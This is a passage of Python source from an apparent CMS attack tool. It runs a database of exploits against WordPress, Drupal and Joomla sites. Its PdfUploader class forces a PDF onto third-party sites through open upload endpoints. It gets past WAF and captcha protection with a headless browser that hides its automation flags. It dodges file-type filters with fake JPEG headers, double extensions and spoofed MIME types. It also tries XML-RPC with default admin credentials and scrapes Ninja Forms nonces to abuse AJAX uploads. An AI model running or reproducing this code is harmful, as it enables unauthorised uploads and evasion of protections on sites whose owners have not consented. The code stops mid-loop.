            elif body_type == 'raw':
                body = self.pdf_bytes
            elif body_type == 'xmlrpc':
                b64pdf = base64.b64encode(self.pdf_bytes).decode()
                body = (
                    '<?xml version="1.0"?><methodCall>'
                    '<methodName>metaWeblog.newMediaObject</methodName><params>'
                    '<param><value>1</value></param>'
                    '<param><value>admin</value></param>'
                    '<param><value>password</value></param>'
                    '<param><value><struct>'
                    f'<member><name>name</name><value>{self.pdf_filename}</value></member>'
                    '<member><name>type</name><value>application/pdf</value></member>'
                    f'<member><name>bits</name><value><base64>{b64pdf}</base64></value></member>'
                    '</struct></value></param></params></methodCall>'
                ).encode()
                headers.setdefault('Content-Type', 'text/xml')
            elif body_type == 'json':
                json_body = vuln.get('json_body')
                if json_body:
                    body = json.dumps(json_body).encode()
                else:
                    # Default Drupal JSON:API body
                    body = json.dumps({
                        "data": {
                            "type": "file--file",
                            "attributes": {
                                "filename": self.pdf_filename,
                                "data": base64.b64encode(self.pdf_bytes).decode()
                            }
                        }
                    }).encode()
            # body_type == 'none': body stays None

            status, resp_headers, resp = self._request(method, url, headers, body)

            if status == 0:
                if len(paths) > 1:
                    continue
                self._add(vid, vname, 'error', 'connection failed')
                return

            text = resp.decode('utf-8', errors='replace')

            # Special: OPTIONS check for PUT in Allow header
            if vuln.get('check_allow_put'):
                allow = resp_headers.get('Allow', '') + resp_headers.get('allow', '')
                if 'PUT' in allow.upper():
                    self._add(vid, vname, 'vulnerable', f'PUT allowed on {path}')
                    return
                if len(paths) > 1:
                    continue
                self._add(vid, vname, 'safe', 'no directories allow PUT')
                return

            # Check safe_body first (e.g. XML-RPC faultString)
            safe_bodies = vuln.get('safe_body', [])
            if safe_bodies and any(s in text for s in safe_bodies):
                self._add(vid, vname, 'safe', 'auth required or method disabled')
                return

            # Check success
            success_statuses = vuln.get('success_status', [200])
            success_bodies = vuln.get('success_body', [])

            if status in success_statuses:
                body_match = not success_bodies or any(s in text for s in success_bodies)
                if body_match:
                    detail = vuln.get('success_detail', f'HTTP {status}')

                    # Try to verify upload via JSON key
                    json_key = vuln.get('json_url_key')
                    if json_key:
                        try:
                            data = json.loads(resp)
                            src = data.get(json_key, '')
                            if src and self._verify_upload(src):
                                self._add(vid, vname, 'vulnerable',
                                          f'{detail}, file at {src}', src)
                                return
                        except Exception:
                            pass

                    # Try to verify PUT upload
                    if vuln.get('verify_upload') and status in (200, 201, 204):
                        if self._verify_upload(url):
                            self._add(vid, vname, 'vulnerable',
                                      f'{detail}, file verified', url)
                            return
                        if len(paths) > 1:
                            continue
                        self._add(vid, vname, 'safe', f'HTTP {status} but file not verified')
                        return

                    self._add(vid, vname, 'vulnerable', detail)
                    return

            if status == 404:
                if len(paths) > 1:
                    continue
                self._add(vid, vname, 'safe', 'endpoint not found')
                return
            if status in (401, 403):
                self._add(vid, vname, 'safe', f'{status} Forbidden')
                return
            if status in (301, 302, 307):
                self._add(vid, vname, 'safe', 'redirect (auth required)')
                return
            if status == 405:
                if body_type == 'xmlrpc':
                    self._add(vid, vname, 'safe', 'XML-RPC disabled')
                    return
                if len(paths) > 1:
                    continue
                self._add(vid, vname, 'safe', 'method not allowed')
                return

            if len(paths) > 1:
                continue
            self._add(vid, vname, 'safe', f'HTTP {status}')
            return

        # Exhausted all paths
        safe_detail = vuln.get('safe_detail', 'no vulnerable endpoints')
        self._add(vid, vname, 'safe', safe_detail)

    # ── Exposure / Misconfiguration Checks ───────────────────────

    def _check_exposures(self):
        """Quick GET requests to common sensitive paths."""
        def check_one(path, name, indicators):
            url = self.target + path
            status, _, resp = self._request('GET', url)
            if status != 200:
                return
            text = resp.decode('utf-8', errors='replace')[:8192]
            if any(ind in text for ind in indicators):
                self._add('exposure-' + name.lower().replace(' ', '-'),
                          name, 'vulnerable', f'sensitive file found at {path}')

        with ThreadPoolExecutor(max_workers=8) as pool:
            futures = [pool.submit(check_one, path, name, indicators)
                       for path, name, indicators in EXPOSURE_CHECKS]
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass

    # ── Orchestrator ─────────────────────────────────────────────

    def run_all_checks(self):
        """Detect CMS, discover & enumerate plugins, run all checks in parallel."""
        self.detect_cms()
        self._dbg(f"CMS detected: {self.cms}")

        # Connectivity check — reuse detect_cms() result to avoid redundant request
        if not self._site_reachable:
            # detect_cms made up to 5 requests and none got a response — retry once
            status, _, _ = self._request('GET', self.target + '/')
            self._dbg(f"Connectivity retry: HTTP {status}")
            if status == 0:
                self._add('connectivity', 'Site Connectivity', 'error', 'site unreachable')
                return {"site": self.target, "cms": self.cms or "unknown",
                        "checks_run": len(self.results), "results": self.results}
            self._site_reachable = True
        self._dbg(f"Connectivity: OK (site reachable)")

        # Phase 1: Discover plugins dynamically (HTML scraping + dir listing + REST)
        discovered = set()
        if (self.cms or 'wordpress') == 'wordpress':
            discovered = self._discover_plugins()
        self._dbg(f"Phase 1 discovered: {len(discovered)} plugins: {sorted(discovered)[:20]}")

        # Phase 2: Enumerate VULN_DB plugins for version info
        installed = self._enumerate_plugins()
        self._dbg(f"Phase 2 installed: {len(installed)} plugins: {dict(list(installed.items())[:20])}")

        # Merge: version-check any discovered plugin that has a readme.txt
        discovered_new = discovered - set(installed.keys())
        if discovered_new:
            self._dbg(f"Merge: probing {len(discovered_new)} new slugs")
            def probe_version(slug):
                url = self.target + f'/wp-content/plugins/{slug}/readme.txt'
                st, _, body = self._request('GET', url)
                if st == 200 and body:
                    text = body.decode('utf-8', errors='replace')
                    m = re.search(r'Stable tag:\s*([0-9][0-9.]*)', text, re.I)
                    if m:
                        installed[slug] = m.group(1)
                        return
                    installed[slug] = 'unknown'

            with ThreadPoolExecutor(max_workers=10) as pool:
                futures = [pool.submit(probe_version, s) for s in discovered_new]
                for f in as_completed(futures):
                    try:
                        f.result()
                    except Exception:
                        pass

        # Phase 3: Build VULN_DB check list
        all_vulns = []
        cms_key = self.cms or 'wordpress'
        cms_db = VULN_DB.get(cms_key, {})
        self._dbg(f"Phase 3 cms_key={cms_key}, cms_db keys={list(cms_db.keys())}")

        # Core checks for detected CMS
        core_checks = cms_db.get('core', [])
        all_vulns.extend(core_checks)
        self._dbg(f"Phase 3 core checks: {len(core_checks)}")

        # If CMS unknown, also add other CMS core checks
        if self.cms is None:
            for other_cms in ('wordpress', 'drupal', 'joomla'):
                other_db = VULN_DB.get(other_cms, {})
                for v in other_db.get('core', []):
                    if v not in all_vulns:
                        all_vulns.append(v)
            self._dbg(f"Phase 3 after other CMS cores: {len(all_vulns)}")

        # Plugin checks from VULN_DB
        plugins_db = cms_db.get('plugins', {})
        vuln_db_slugs = set(plugins_db.keys())
        self._dbg(f"Phase 3 VULN_DB has {len(plugins_db)} plugins for {cms_key}")
        blind_added = 0
        version_added = 0
        version_safe = 0
        for slug, info in plugins_db.items():
            if slug in installed:
                inst_ver = installed[slug]
                for vuln in info.get('vulns', []):
                    affected_spec = vuln.get('affected')
                    if affected_spec and inst_ver != 'unknown':
                        if self._version_affected(inst_ver, affected_spec):
                            all_vulns.append(vuln)
                            version_added += 1
                        else:
                            self._add(vuln['id'], vuln['name'], 'safe',
                                      f'installed v{inst_ver}, patched ({affected_spec})')
                            version_safe += 1
                    else:
                        all_vulns.append(vuln)
                        version_added += 1
            else:
                # Plugin not detected — blind test if flag allows
                for vuln in info.get('vulns', []):
                    if vuln.get('blind_test', True):
                        all_vulns.append(vuln)
                        blind_added += 1
        self._dbg(f"Phase 3 plugins: {blind_added} blind, {version_added} version-matched, {version_safe} safe (patched)")

        # Generic checks (always run)
        generic_checks = VULN_DB.get('generic', [])
        all_vulns.extend(generic_checks)
        self._dbg(f"Phase 3 generic: {len(generic_checks)}")
        self._dbg(f"Phase 3 TOTAL all_vulns: {len(all_vulns)}, results so far: {len(self.results)}")

        # Phase 4: Run VULN_DB exploits in parallel
        self._dbg(f"Phase 4 starting: {len(all_vulns)} exploits with {8} workers")
        with ThreadPoolExecutor(max_workers=8) as pool:
            futures = {pool.submit(self._run_exploit, v): v for v in all_vulns}
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    vuln = futures[f]
                    self._add(vuln.get('id', '?'), vuln.get('name', '?'), 'error', str(e))
        self._dbg(f"Phase 4 done: {len(self.results)} results")

        # Phase 5: Generic upload probing for discovered plugins NOT in VULN_DB
        if (self.cms or 'wordpress') == 'wordpress':
            generic_slugs = (discovered | set(installed.keys())) - vuln_db_slugs
            self._dbg(f"Phase 5: {len(generic_slugs)} generic slugs to probe")
            if generic_slugs:
                with ThreadPoolExecutor(max_workers=8) as pool:
                    futures = [pool.submit(self._probe_generic_upload, s)
                               for s in generic_slugs]
                    for f in as_completed(futures):
                        try:
                            f.result()
                        except Exception:
                            pass
        self._dbg(f"Phase 5 done: {len(self.results)} results")

        # Phase 6: Upload directory checks
        if (self.cms or 'wordpress') == 'wordpress':
            self._check_upload_dirs()
        self._dbg(f"Phase 6 done: {len(self.results)} results")

        # Phase 7: Exposure checks
        self._check_exposures()
        self._dbg(f"Phase 7 done: {len(self.results)} results")

        # Phase 8: WAF heuristic — if >70% of checks returned 403, flag it
        total = len(self.results)
        blocked = sum(1 for r in self.results if '403' in r.get('detail', ''))
        if total and blocked / total > 0.7:
            self._dbg(f"Phase 8: WAF detected ({blocked}/{total} blocked)")
            with self._lock:
                for r in self.results:
                    if '403' in r.get('detail', ''):
                        r['detail'] += ' (WAF likely)'

        self._dbg(f"DONE: {len(self.results)} total results")
        return {
            "site": self.target,
            "cms": self.cms or "unknown",
            "plugins_discovered": len(discovered),
            "checks_run": len(self.results),
            "ai_used": self.ai_used,
            "results": self.results
        }


# ── HTTP Server ──────────────────────────────────────────────────────────────

JPEG_HEADER = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'


class PdfUploader:
    """Uploads a PDF to a target endpoint using AI-detected form fields and bypass techniques."""

    def __init__(self, target_url, mode, pdf_bytes, pdf_filename,
                 ai_key='', oai_key='', ai_model=''):
        self.target = target_url.rstrip('/')
        self.mode = mode  # 'auto' | 'form_page' | 'direct'
        self.pdf_bytes = pdf_bytes
        self.pdf_filename = pdf_filename
        self._ai_key = ai_key
        self._oai_key = oai_key
        self._ai_model = ai_model
        self.analysis = None
        self.techniques = []
        self._cookies = {}  # cookies from WAF bypass
        self._waf_detected = None  # name of WAF if detected

    def _request(self, method, url, headers=None, body=None):
        """urllib wrapper. Returns (status, headers_dict, body_bytes)."""
        try:
            h = dict(headers or {})
            if 'User-Agent' not in h:
                h['User-Agent'] = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                   'AppleWebKit/537.36 (KHTML, like Gecko) '
                                   'Chrome/120.0.0.0 Safari/537.36')
            # Attach stored cookies
            if self._cookies:
                cookie_str = '; '.join(f'{k}={v}' for k, v in self._cookies.items())
                h['Cookie'] = cookie_str
            req = urllib.request.Request(url, data=body, method=method, headers=h)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                resp = urllib.request.urlopen(req, timeout=20, context=ctx)
                self._capture_cookies(resp.headers)
                return resp.getcode(), dict(resp.headers), resp.read(2 * 1024 * 1024)
            except urllib.error.HTTPError as e:
                body_bytes = b''
                try:
                    body_bytes = e.read(2 * 1024 * 1024)
                except Exception:
                    pass
                if e.headers:
                    self._capture_cookies(e.headers)
                return e.code, dict(e.headers) if e.headers else {}, body_bytes
        except Exception as e:
            return 0, {}, str(e).encode()

    def _capture_cookies(self, headers):
        """Extract Set-Cookie headers and store them."""
        cookies_raw = headers.get_all('Set-Cookie') if hasattr(headers, 'get_all') else []
        if not cookies_raw:
            sc = headers.get('Set-Cookie')
            if sc:
                cookies_raw = [sc]
        for raw in cookies_raw:
            parts = raw.split(';')[0].strip()
            if '=' in parts:
                k, v = parts.split('=', 1)
                self._cookies[k.strip()] = v.strip()

    # ── WAF Detection & Bypass ────────────────────────────────────

    WAF_PATTERNS = {
        'sgcaptcha': r'\.well-known/sgcaptcha/',
        'cloudflare': r'cf-browser-verification|__cf_chl_managed_tk|challenges\.cloudflare\.com',
        'sucuri': r'sucuri\.net|cloudproxy',
        'wordfence': r'wordfence|wfvt_\d+',
        'imunify360': r'imunify360|i360',
        'shield': r'shield-security|icwp',
    }

    def _detect_waf(self, resp_text):
        """Detect WAF/captcha from response body. Returns name or None."""
        for name, pattern in self.WAF_PATTERNS.items():
            if re.search(pattern, resp_text, re.I):
                return name
        return None

    def _is_waf_response(self, resp_text):
        """Check if a response is a WAF/captcha page (not a real response)."""
        return self._detect_waf(resp_text) is not None

    def _bypass_waf(self, site_root):
        """Attempt to bypass detected WAF. Called before upload attempts."""
        # Probe admin-ajax to check for WAF (most likely to be protected)
        status, headers, body = self._request('GET', site_root + '/wp-admin/admin-ajax.php')
        resp_text = body.decode('utf-8', errors='replace')
        waf = self._detect_waf(resp_text)

        if not waf:
            status, headers, body = self._request('GET', site_root)
            resp_text = body.decode('utf-8', errors='replace')
            waf = self._detect_waf(resp_text)

        if not waf:
            return  # No WAF detected

        self._waf_detected = waf
        # Use headless browser to solve JS challenges and get cookies
        self._browser_bypass(site_root)

    def _get_browser(self):
        """Get or create a headless Edge browser instance."""
        if hasattr(self, '_driver') and self._driver:
            return self._driver
        try:
            from selenium.webdriver import Edge, EdgeOptions

            opts = EdgeOptions()
            opts.add_argument('--headless=new')
            opts.add_argument('--disable-gpu')
            opts.add_argument('--no-sandbox')
            opts.add_argument('--disable-dev-shm-usage')
            opts.add_argument('--disable-blink-features=AutomationControlled')
            opts.add_experimental_option('excludeSwitches', ['enable-automation'])
            opts.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')

            self._driver = Edge(options=opts)
            self._driver.set_page_load_timeout(30)
            return self._driver
        except Exception as e:
            print(f"[browser] Failed to start: {e}", flush=True)
            self._driver = None
            return None

    def _close_browser(self):
        """Close the browser if open."""
        if hasattr(self, '_driver') and self._driver:
            try:
                self._driver.quit()
            except Exception:
                pass
            self._driver = None

    def _browser_bypass(self, site_root):
        """Launch headless browser, solve JS captcha, keep it open for uploads."""
        driver = self._get_browser()
        if not driver:
            return

        try:
            # Load the site — browser auto-solves JS captchas
            driver.get(site_root)
            time.sleep(3)
            # Also visit admin-ajax to establish cookies for that path
            driver.get(site_root + '/wp-admin/admin-ajax.php')
            time.sleep(2)
            self._waf_detected += ' (browser ready)'
        except Exception as e:
            print(f"[waf-bypass] Browser navigation failed: {e}", flush=True)

    def _browser_upload(self, upload_url, field_name, filename, mime, file_bytes, extra_fields=None):
        """Upload a file using the browser's fetch() — bypasses WAF/TLS fingerprinting."""
        driver = self._driver if hasattr(self, '_driver') else None
        if not driver:
            return None

        b64data = base64.b64encode(file_bytes).decode()
        extra_js = ''
        if extra_fields:
            for k, v in extra_fields.items():
                extra_js += f"fd.append('{k}', '{v}');\n"

        js = f"""
        return await (async () => {{
            try {{
                const raw = atob('{b64data}');
                const arr = new Uint8Array(raw.length);
                for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
                const blob = new Blob([arr], {{type: '{mime}'}});
                const fd = new FormData();
                fd.append('{field_name}', blob, '{filename}');
                {extra_js}
                const resp = await fetch('{upload_url}', {{method: 'POST', body: fd}});
                const text = await resp.text();
                return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
            }} catch(e) {{
                return JSON.stringify({{status: 0, body: e.message}});
            }}
        }})();
        """
        try:
            result_str = driver.execute_script(js)
            return json.loads(result_str)
        except Exception as e:
            return {'status': 0, 'body': str(e)}

    def _browser_find_form_and_upload(self, site_root, plugin):
        """Use browser to find a form page with file upload, extract nonce, upload."""
        driver = self._driver if hasattr(self, '_driver') else None
        if not driver:
            return

        # Common form page paths to check
        form_paths = [
            '/contact', '/contact-us', '/apply', '/get-involved', '/volunteer',
            '/join', '/submit', '/upload', '/registration', '/register',
            '/careers', '/scholarship', '/application', '/enrollment',
            '/inquiry', '/request', '/feedback', '/support',
        ]

        # Find a page with the plugin's file upload field
        form_url = None
        for path in form_paths:
            try:
                driver.get(site_root + path)
                time.sleep(2)
                src = driver.page_source
                # Check for file upload input from this plugin
                has_file = ('type="file"' in src or "type='file'" in src or
                            'nf-fu' in src or 'file_upload' in src.lower())
                if has_file and plugin.replace('-', '') in src.replace('-', '').lower():
                    form_url = site_root + path
                    break
            except Exception:
                continue

        if not form_url:
            # Also check links from homepage
            try:
                driver.get(site_root)
                time.sleep(2)
                links = driver.execute_script('''
                    return [...document.querySelectorAll('a[href]')]
                        .map(a => a.href)
                        .filter(h => h.includes(arguments[0]) && !h.includes('#'))
                        .slice(0, 30);
                ''', site_root)
                for link in links:
                    if any(kw in link.lower() for kw in ['form', 'apply', 'contact', 'upload', 'submit']):
                        driver.get(link)
                        time.sleep(2)
                        src = driver.page_source
                        if 'type="file"' in src or 'nf-fu' in src:
                            form_url = link
                            break
            except Exception:
                pass

        if not form_url:
            return

        # We're on the form page — extract upload nonce + field info
        src = driver.page_source

        # Ninja Forms specific
        if 'ninja' in plugin.lower() or 'nf-' in src:
            self._nf_browser_upload(driver, site_root, src)

    def _nf_browser_upload(self, driver, site_root, page_src):
        """Ninja Forms specific: extract nonce + field_id, upload via AJAX."""
        import re as _re

        # Find upload nonce
        nonce_match = _re.search(r'nf-upload-nonce.*?value="([a-f0-9]+)"', page_src)
        if not nonce_match:
            return
        nonce = nonce_match.group(1)

        # Find file upload field ID (e.g., files-96)
        field_match = _re.search(r'name="files-(\d+)\[\]".*?type="file"', page_src)
        if not field_match:
            # Try reverse order
            field_match = _re.search(r'type="file".*?name="files-(\d+)', page_src)
        if not field_match:
            # Search in containers
            field_match = _re.search(r'file_upload-container.*?id="nf-field-(\d+)"', page_src)
        if not field_match:
            return
        field_id = field_match.group(1)

        # Find form ID
        form_match = _re.search(r"form\.id='(\d+)'", page_src)
        form_id = form_match.group(1) if form_match else '1'

        b64data = base64.b64encode(self.pdf_bytes).decode()

        result = driver.execute_script(f"""
        return await (async () => {{
            try {{
                const raw = atob('{b64data}');
                const arr = new Uint8Array(raw.length);
                for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
                const blob = new Blob([arr], {{type: 'application/pdf'}});
                const fd = new FormData();
                fd.append('files-{field_id}', blob, '{self.pdf_filename}');
                fd.append('action', 'nf_fu_upload');
                fd.append('field_id', '{field_id}');
                fd.append('nonce', '{nonce}');
                fd.append('form_id', '{form_id}');
                const resp = await fetch('/wp-admin/admin-ajax.php', {{method: 'POST', body: fd}});
                const text = await resp.text();
                return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
            }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
        }})();
        """)

        try:
            res = json.loads(result)
        except Exception:
            res = {'status': 0, 'body': result or 'parse error'}

        resp_text = res.get('body', '')
        status = res.get('status', 0)
        success = status == 200 and 'tmp_name' in resp_text and '"errors":[]' in resp_text

        # Extract the uploaded file info
        upload_url = ''
        if success:
            # The file is at /wp-content/uploads/ninja-forms/{form_id}/{filename}
            upload_url = f"{site_root}/wp-content/uploads/ninja-forms/{form_id}/{self.pdf_filename}"

        self.techniques.append({
            'name': f'Ninja Forms Browser Upload (field={field_id}, form={form_id})',
            'http_status': status,
            'success': success,
            'response_snippet': resp_text[:500],
            'upload_url': upload_url,
        })

    def _multipart_body(self, field_name, filename, content_type, file_bytes, extra_fields=None):
        """Build multipart/form-data. Returns (body_bytes, content_type_header)."""
        boundary = 'BubbleGumUpload' + uuid.uuid4().hex[:12]
        body = b''
        if extra_fields:
            for k, v in extra_fields.items():
                body += f'--{boundary}\r\n'.encode()
                body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode()
        body += f'Content-Type: {content_type}\r\n\r\n'.encode()
        body += file_bytes + b'\r\n'
        body += f'--{boundary}--\r\n'.encode()
        return body, f'multipart/form-data; boundary={boundary}'

    def _call_ai(self, prompt, max_tokens=1024):
        """Call Anthropic or OpenAI. Returns '' on error."""
        try:
            is_openai = self._ai_model.startswith(('gpt-', 'o1', 'o3', 'o4'))
            if is_openai:
                if not self._oai_key:
                    return ''
                url = 'https://api.openai.com/v1/chat/completions'
                payload = json.dumps({
                    'model': self._ai_model,
                    'messages': [{'role': 'user', 'content': prompt}],
                    'max_tokens': max_tokens,
                    'temperature': 0
                }).encode()
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {self._oai_key}'
                }
            else:
                if not self._ai_key:
                    return ''
                url = 'https://api.anthropic.com/v1/messages'
                payload = json.dumps({
                    'model': self._ai_model or 'claude-sonnet-4-20250514',
                    'max_tokens': max_tokens,
                    'messages': [{'role': 'user', 'content': prompt}]
                }).encode()
                headers = {
                    'Content-Type': 'application/json',
                    'x-api-key': self._ai_key,
                    'anthropic-version': '2023-06-01'
                }

            req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
            ctx = ssl.create_default_context()
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            data = json.loads(resp.read().decode())

            if is_openai:
                return data.get('choices', [{}])[0].get('message', {}).get('content', '')
            else:
                blocks = data.get('content', [])
                return blocks[0].get('text', '') if blocks else ''
        except Exception:
            return ''

    # ── Spammer URL mapping ────────────────────────────────────
    WP_FORM_PLUGINS = {
        'wpforms': 'wpforms', 'wpcf7_uploads': 'contact-form-7',
        'gravity_forms': 'gravity-forms', 'formidable': 'formidable',
        'ninja-forms': 'ninja-forms', 'forminator': 'forminator',
        'everest_forms': 'everest-forms', 'ws_form': 'ws-form',
    }

    def _parse_spammer_url(self):
        """Parse a spammer PDF URL to extract site_root, CMS, plugin, upload subpath."""
        parsed = urllib.parse.urlparse(self.target)
        site_root = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path

        cms = None
        plugin = None
        upload_subpath = None

        # WordPress detection
        if '/wp-content/' in path:
            cms = 'wordpress'
            # Extract upload subpath (directory portion)
            last_slash = path.rfind('/')
            if last_slash > 0:
                upload_subpath = path[:last_slash + 1]

            # Detect plugin from /wp-content/uploads/{plugin_dir}/
            m = re.search(r'/wp-content/uploads/([a-z0-9_-]+)/', path)
            if m:
                upload_dir = m.group(1)
                plugin = self.WP_FORM_PLUGINS.get(upload_dir, upload_dir)

        # Drupal detection
        elif '/sites/default/files/' in path:
            cms = 'drupal'
            last_slash = path.rfind('/')
            if last_slash > 0:
                upload_subpath = path[:last_slash + 1]

        # Joomla detection
        elif '/images/' in path or '/media/' in path:
            if '/administrator/' in path or '/components/' in path:
                cms = 'joomla'
                last_slash = path.rfind('/')
                if last_slash > 0:
                    upload_subpath = path[:last_slash + 1]

        return {
            'site_root': site_root,
            'cms': cms or 'unknown',
            'plugin': plugin or 'unknown',
            'upload_subpath': upload_subpath or '/',
            'original_path': path,
        }

    def _auto_upload(self):
        """Auto-upload: parse spammer URL, lookup VULN_DB, try targeted endpoints."""
        info = self._parse_spammer_url()
        site = info['site_root']
        cms = info['cms']
        plugin = info['plugin']
        subpath = info['upload_subpath']

        # Try to bypass WAF before uploading
        self._bypass_waf(site)

        self._auto_info = {
            'cms': cms,
            'plugin': plugin,
            'endpoints_tried': 0,
            'waf': self._waf_detected or 'none',
        }

        base_name = self.pdf_filename.rsplit('.', 1)[0] if '.' in self.pdf_filename else self.pdf_filename
        jpeg_pdf = JPEG_HEADER + self.pdf_bytes

        bypass_variants = [
            ('Normal PDF', self.pdf_filename, 'application/pdf', self.pdf_bytes),
            ('JPEG magic + .jpg + image/jpeg', f'{base_name}.jpg', 'image/jpeg', jpeg_pdf),
            ('Raw PDF + .jpg + image/jpeg', f'{base_name}.jpg', 'image/jpeg', self.pdf_bytes),
            ('JPEG magic + .pdf + image/jpeg', self.pdf_filename, 'image/jpeg', jpeg_pdf),
            ('Double ext .pdf.jpg', f'{self.pdf_filename}.jpg', 'image/jpeg', self.pdf_bytes),
            ('PDF as image/jpeg MIME', self.pdf_filename, 'image/jpeg', self.pdf_bytes),
        ]

        # Collect endpoints: plugin-specific from VULN_DB + WP core
        endpoints = []

        # 1. Plugin-specific endpoints from VULN_DB
        cms_db = VULN_DB.get(cms, {})
        plugins_db = cms_db.get('plugins', {})
        plugin_info = plugins_db.get(plugin)
        if plugin_info:
            for vuln in plugin_info.get('vulns', []):
                if vuln.get('body_type') in ('upload', 'raw'):
                    paths = vuln.get('paths', [vuln['path']] if vuln.get('path') else [])
                    for p in paths:
                        endpoints.append({
                            'name': vuln.get('name', plugin),
                            'url': site + p,
                            'field': vuln.get('upload_field', 'file'),
                            'extra': vuln.get('extra_fields'),
                            'body_type': vuln.get('body_type', 'upload'),
                            'headers': vuln.get('headers'),
                        })

        # 2. Direct PUT/POST to the spammer's upload directory (WebDAV-style)
        target_filename = self.pdf_filename
        direct_url = site + subpath + target_filename
        endpoints.append({
            'name': 'Direct PUT to spammer path',
            'url': direct_url,
            'field': 'file', 'body_type': 'put_direct',
        })

        # 3. WP core upload endpoints (always try on WordPress)
        if cms == 'wordpress':
            core_endpoints = [
                {'name': 'WP REST API Media', 'url': site + '/wp-json/wp/v2/media',
                 'field': 'file', 'body_type': 'raw', 'headers': {
                     'Content-Disposition': f'attachment; filename="{self.pdf_filename}"',
                     'Content-Type': 'application/pdf'}},
                {'name': 'WP XML-RPC', 'url': site + '/xmlrpc.php',
                 'field': 'file', 'body_type': 'xmlrpc'},
                {'name': 'WP Admin AJAX upload-attachment', 'url': site + '/wp-admin/admin-ajax.php?action=upload-attachment',
                 'field': 'async-upload', 'body_type': 'upload',
                 'extra': {'action': 'upload-attachment'}},
                {'name': 'WP Admin AJAX async-upload', 'url': site + '/wp-admin/admin-ajax.php?action=async-upload',
                 'field': 'async-upload', 'body_type': 'upload',
                 'extra': {'action': 'async-upload'}},
            ]
            for ep in core_endpoints:
                # Don't duplicate if already added from plugin vulns
                if not any(e['url'] == ep['url'] for e in endpoints):
                    endpoints.append(ep)

        total_tried = 0
        for ep in endpoints:
            ep_name = ep.get('name', 'Unknown')

            if ep.get('body_type') == 'put_direct':
                # Try PUT and POST directly to the file path
                for method in ('PUT', 'POST'):
                    total_tried += 1
                    hdrs = {'Content-Type': 'application/pdf'}
                    status, resp_headers, resp_body = self._request(method, ep['url'], hdrs, self.pdf_bytes)
                    resp_text = resp_body.decode('utf-8', errors='replace')
                    is_waf = self._is_waf_response(resp_text)
                    success = 200 <= status < 300 and not is_waf
                    result = {
                        'name': f'{ep_name} | {method}' + (' [WAF blocked]' if is_waf else ''),
                        'http_status': status,
                        'success': success,
                        'response_snippet': resp_text[:500],
                        'upload_url': ep['url'] if success else '',
                    }
                    self.techniques.append(result)
                    if success and self._verify_url(ep['url']):
                        self._auto_info['endpoints_tried'] = total_tried
                        return
                continue

            if ep.get('body_type') == 'xmlrpc':
                # XML-RPC: single attempt, no bypass variants
                total_tried += 1
                b64pdf = base64.b64encode(self.pdf_bytes).decode()
                xmlrpc_body = (
                    '<?xml version="1.0"?><methodCall>'
                    '<methodName>metaWeblog.newMediaObject</methodName><params>'
                    '<param><value>1</value></param>'
                    '<param><value>admin</value></param>'
                    '<param><value>password</value></param>'
                    '<param><value><struct>'
                    f'<member><name>name</name><value>{self.pdf_filename}</value></member>'
                    '<member><name>type</name><value>application/pdf</value></member>'
                    f'<member><name>bits</name><value><base64>{b64pdf}</base64></value></member>'
                    '</struct></value></param></params></methodCall>'
                ).encode()
                self._try_upload(f'{ep_name} | XML-RPC', ep['url'],
                                 'file', self.pdf_filename, 'text/xml',
                                 xmlrpc_body, None)
                # Check for early success
                if self.techniques and self.techniques[-1]['success']:
                    url_found = self.techniques[-1].get('upload_url', '')
                    if url_found and self._verify_url(url_found):
                        self._auto_info['endpoints_tried'] = total_tried
                        return
                continue

            if ep.get('body_type') == 'raw':
                # Raw body: send PDF bytes directly with headers
                total_tried += 1
                hdrs = dict(ep.get('headers') or {})
                # Replace {filename} placeholder in headers
                for k, v in hdrs.items():
                    if '{filename}' in v:
                        hdrs[k] = v.replace('{filename}', self.pdf_filename)
                status, resp_headers, resp_body = self._request('POST', ep['url'], hdrs, self.pdf_bytes)
                resp_text = resp_body.decode('utf-8', errors='replace')

                success = False
                upload_url_found = ''
                trimmed = resp_text.strip().lower()
                is_html = (trimmed.startswith(('<!doctype', '<html'))
                           or '<form' in resp_text[:2000].lower())
                is_waf = self._is_waf_response(resp_text)
                if 200 <= status < 400 and not is_html and not is_waf:
                    for kw in ['success', 'uploaded', '"url"', '"link"', '"path"',
                               'source_url', 'file_url', 'media_url']:
                        if kw in resp_text.lower():
                            success = True
                            break
                if success:
                    try:
                        rj = json.loads(resp_text)
                        for key in ['url', 'source_url', 'file_url', 'link', 'path',
                                    'media_url', 'location']:
                            val = rj.get(key, '')
                            if isinstance(val, str) and val.startswith('http'):
                                upload_url_found = val
                                break
                    except (json.JSONDecodeError, ValueError):
                        pass

                result = {
                    'name': f'{ep_name} | Raw POST',
                    'http_status': status,
                    'success': success,
                    'response_snippet': resp_text[:500],
                    'upload_url': upload_url_found,
                }
                self.techniques.append(result)

                if success and upload_url_found and self._verify_url(upload_url_found):
                    self._auto_info['endpoints_tried'] = total_tried
                    return
                continue

            # Standard multipart upload: try all bypass variants
            field = ep.get('field', 'file')
            extra = ep.get('extra')
            for variant_name, filename, mime, file_bytes in bypass_variants:
                total_tried += 1
                label = f'{ep_name} | {variant_name}'
                self._try_upload(label, ep['url'], field, filename, mime, file_bytes, extra)

                # Early exit on verified success
                if self.techniques and self.techniques[-1]['success']:
